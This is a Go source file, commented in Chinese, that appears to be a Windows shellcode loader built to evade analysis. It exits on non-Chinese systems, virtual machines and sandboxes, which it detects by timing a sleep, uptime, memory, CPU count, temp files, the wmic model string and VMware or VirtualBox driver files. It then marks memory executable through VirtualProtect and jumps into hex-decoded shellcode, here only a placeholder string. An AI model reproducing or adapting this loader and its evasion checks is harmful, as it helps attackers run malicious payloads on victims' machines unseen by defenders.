package main

import (
	"encoding/hex"
	"golang.org/x/sys/windows"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// 检测语言，依赖windows数据包，编译后会增加0.6M大小
func check_language() {
	a, _ := windows.GetUserPreferredUILanguages(windows.MUI_LANGUAGE_NAME) //获取当前系统首选语言
	if a[0] != "zh-CN" {
		os.Exit(1)
	}
}

func check_sandbox() {
	// 1. 延时运行
	timeSleep1, _ := timeSleep()
	// 2. 检测开机时间
	bootTime1, _ := bootTime()
	// 3. 检测物理内存
	physicalMemory1, _ := physicalMemory()
	// 4. 检测CPU核心数
	numberOfCPU1, _ := numberOfCPU()
	// 5. 检测临时文件数
	numberOfTempFiles1, _ := numberOfTempFiles()
	level := timeSleep1 + bootTime1 + physicalMemory1 + numberOfCPU1 + numberOfTempFiles1 // 有五个等级，等级越趋向于5，越像真机
	//fmt.Println("level:", level)
	if level < 4 {
		os.Exit(1)
	}
}

// 1. 延时运行
func timeSleep() (int, error) {
	startTime := time.Now()
	time.Sleep(5 * time.Second)
	endTime := time.Now()
	sleepTime := endTime.Sub(startTime)
	if sleepTime >= time.Duration(5*time.Second) {
		//fmt.Println("睡眠时间为:", sleepTime)
		return 1, nil
	} else {
		return 0, nil
	}
}

// 2. 检测开机时间
// 许多沙箱检测完毕后会重置系统，我们可以检测开机时间来判断是否为真实的运行状况。
func bootTime() (int, error) {
	var kernel = syscall.NewLazyDLL("Kernel32.dll")
	GetTickCount := kernel.NewProc("GetTickCount")
	r, _, _ := GetTickCount.Call()
	if r == 0 {
		return 0, nil
	}
	ms := time.Duration(r * 1000 * 1000)
	tm := time.Duration(30 * time.Minute)
	//fmt.Println(ms,tm)
	if ms < tm {
		return 0, nil
	} else {
		return 1, nil
	}

}
// 3、物理内存大小
func physicalMemory() (int, error) {
	var mod = syscall.NewLazyDLL("kernel32.dll")
	var proc = mod.NewProc("GetPhysicallyInstalledSystemMemory")
	var mem uint64
	proc.Call(uintptr(unsafe.Pointer(&mem)))
	mem = mem / 1048576
	//fmt.Printf("物理内存为%dG\n", mem)
	if mem < 4 {
		return 0, nil // 小于4GB返回0
	}
	return 1, nil // 大于4GB返回1
}

func numberOfCPU() (int, error) {
	a := runtime.NumCPU()
	//fmt.Println("CPU核心数为:", a)
	if a < 4 {
		return 0, nil // 小于4核心数,返回0
	} else {
		return 1, nil // 大于4核心数，返回1
	}
}
func numberOfTempFiles() (int, error) {
	conn := os.Getenv("temp") // 通过环境变量读取temp文件夹路径
	var k int
	if conn == "" {
		//fmt.Println("未找到temp文件夹，或temp文件夹不存在")
		return 0, nil
	} else {
		local_dir := conn
		err := filepath.Walk(local_dir, func(filename string, fi os.FileInfo, err error) error {
			if fi.IsDir() {
				return nil
			}
			k++
			// fmt.Println("filename:", filename)  // 输出文件名字
			return nil
		})
		//fmt.Println("Temp总共文件数量:", k)
		if err != nil {
			// fmt.Println("路径获取错误")
			return 0, nil
		}
	}
	if k < 30 {
		return 0, nil
	}
	return 1, nil
}

func check_virtual() (bool, error) { // 识别虚拟机
	model := ""
	var cmd *exec.Cmd
	cmd = exec.Command("cmd", "/C", "wmic path Win32_ComputerSystem get Model")
	stdout, err := cmd.Output()
	if err != nil {
		return false, err
	}
	model = strings.ToLower(string(stdout))
	if strings.Contains(model, "VirtualBox") || strings.Contains(model, "virtual") || strings.Contains(model, "VMware") ||
		strings.Contains(model, "KVM") || strings.Contains(model, "Bochs") || strings.Contains(model, "HVM domU") || strings.Contains(model, "Parallels") {
		return true, nil //如果是虚拟机则返回true
	}
	return false, nil
}
func PathExists(path string) (bool, error) {
	_, err := os.Stat(path)
	if err == nil {
		return true, nil
	}
	if os.IsNotExist(err) {
		return false, nil
	}
	return false, err
}
func fack(path string) {
	b, _ := PathExists(path)
	if b {
		os.Exit(1)
	}
}
func check_file() {
	fack("C:\\windows\\System32\\Drivers\\Vmmouse.sys")
	fack("C:\\windows\\System32\\Drivers\\vmtray.dll")
	fack("C:\\windows\\System32\\Drivers\\VMToolsHook.dll")
	fack("C:\\windows\\System32\\Drivers\\vmmousever.dll")
	fack("C:\\windows\\System32\\Drivers\\vmhgfs.dll")
	fack("C:\\windows\\System32\\Drivers\\vmGuestLib.dll")
	fack("C:\\windows\\System32\\Drivers\\VBoxMouse.sys")
	fack("C:\\windows\\System32\\Drivers\\VBoxGuest.sys")
	fack("C:\\windows\\System32\\Drivers\\VBoxSF.sys")
	fack("C:\\windows\\System32\\Drivers\\VBoxVideo.sys")
	fack("C:\\windows\\System32\\vboxdisp.dll")
	fack("C:\\windows\\System32\\vboxhook.dll")
	fack("C:\\windows\\System32\\vboxoglerrorspu.dll")
	fack("C:\\windows\\System32\\vboxoglpassthroughspu.dll")
	fack("C:\\windows\\System32\\vboxservice.exe")
	fack("C:\\windows\\System32\\vboxtray.exe")
	fack("C:\\windows\\System32\\VBoxControl.exe")
}

var VirtualAlloc = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

func aaa(a unsafe.Pointer, b uintptr, c uint32, d unsafe.Pointer) bool {
	ret, _, _ := VirtualAlloc.Call(
		uintptr(a),
		uintptr(b),
		uintptr(c),
		uintptr(d))
	return ret > 0
}

func Run(sc []byte) {
	fly := func() {}
	var xx uint32
	if !aaa(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&fly))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&xx)) {
	}
	**(**uintptr)(unsafe.Pointer(&fly)) = *(*uintptr)(unsafe.Pointer(&sc))
	var yy uint32
	aaa(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&yy))
	fly()
}

func ScFromHex(scHex string) []byte{
	var charcode []byte
	charcode, _ = hex.DecodeString(string(scHex))
	return charcode
}
func main() {
	check_language()
	check_file()
	check,_ := check_virtual()
	if check == true{
		os.Exit(1)
	}
	check_sandbox()
	sccode := ScFromHex("000111222333444")
	Run(sccode)
}
